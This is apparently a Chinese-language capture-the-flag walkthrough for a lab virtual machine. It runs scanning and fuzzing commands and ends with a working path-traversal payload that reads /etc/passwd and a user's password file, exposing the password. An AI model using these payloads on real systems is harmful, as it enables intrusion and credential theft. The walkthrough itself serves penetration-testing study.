### 1、主机发现

> ```
>  nmap -sP 172.20.10.1/24
> ```
>
> 主机ip：靶机iphttp://172.20.10.6
>
> <img src="https://tva1.sinaimg.cn/large/008i3skNly1gvku6gh8sdj60ry0dq0uc02.jpg" alt="image-20211019191815269"  />
>
> 
>
> ```
> arp-scan -l
> ```
>
> ![image-20211019192332461](https://tva1.sinaimg.cn/large/008i3skNly1gvkubt6806j60uq0a040602.jpg)





### 2、端口扫描

>```
>nmap -p 1-65535 -A 172.20.10.6
>```
>
>>端口 打开的端口 22   80
>
>![image-20211019192009604](https://tva1.sinaimg.cn/large/008i3skNly1gvku8a1vh3j60wu0fc0va02.jpg)

### 3、查看80端口的web

![image-20211019192527624](https://tva1.sinaimg.cn/large/008i3skNly1gvkudt639jj60ml0d5my502.jpg)

>#### 1.目录扫描
>
>  ```
>  dirb http://172.20.10.6
>  ```
>
>​	发现目录1./dev  2. /wordpress
>
>```
>dirb http://172.20.10.6 -X .txt,.php,.zip
>```
>
>   发现文件
>
>​	![image-20211019202837839](https://tva1.sinaimg.cn/large/008i3skNly1gvkw7j2afij60mu04ut9802.jpg)
>
>  查看文件
>
>```
>curl http://172.20.10.6/secret.txt
>```
>
>#### 返回提示
>
>>  Looks like you have got some secrets.
>>
>> Ok I just want to do some help to you.
>>
>> Do some more fuzz on every page of php which was finded by you. And if
>> you get any right parameter then follow the below steps. If you still stuck
>> Learn from here a basic tool with good usage for OSCP.
>>
>> https://github.com/hacknpentest/Fuzzing/blob/master/Fuzz_For_Web
>>
>> 
>>
>> //see the location.txt and you will get your next move//



>### fuzz
>
>```
>wfuzz  -c -w /usr/share/wfuzz/wordlist/general/common.txt cural http://172.20.10.6/index.php?FUZZ=ww
>```
>
>![image-20211019194719545](https://tva1.sinaimg.cn/large/008i3skNly1gvkv0t35guj61700k8tbl02.jpg)
>
>找到参数 file



>#### 根据上面提示访问
>
> 	`http:172.20.10.6/index.php?flie=location.txt`
>
>![image-20211019203607026](https://tva1.sinaimg.cn/large/008i3skNly1gvkwfajujsj30fk072t8w.jpg)



> ### 根据提示访问
>
> `http://172.20.10.6/image.php?secrettier360=/etc/passwd/`
>
> ![image-20211019204745123](https://tva1.sinaimg.cn/large/008i3skNly1gvkwrgd5yxj60u00zagtj02.jpg)





>![image-20211019211015472](https://tva1.sinaimg.cn/large/008i3skNly1gvkxetgmakj60rk016q2y02.jpg)
>
>`curl http://172.20.10.6/image.php\?secrettier360\=../../../home/saket/password.txt`
>
>![image-20211019211044599](https://tva1.sinaimg.cn/large/008i3skNly1gvkxfbmd2aj608204vjrb02.jpg)
>
>得到 saket 的密码是follow_the_ippsec



d













